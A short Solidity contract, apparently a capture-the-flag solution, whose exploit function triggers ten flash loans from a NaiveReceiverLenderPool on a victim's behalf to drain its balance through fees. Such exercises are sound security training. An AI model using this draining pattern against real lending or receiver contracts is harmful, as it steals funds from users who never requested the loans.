// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";

contract Malicious {

    function exploit(address pool, address victim) public {
        for (uint8 i = 0; i < 10; ++i) {
            NaiveReceiverLenderPool(payable(pool)).flashLoan(victim, 1);
        }
        require(victim.balance == 0, "Victim still has some money");
    }
}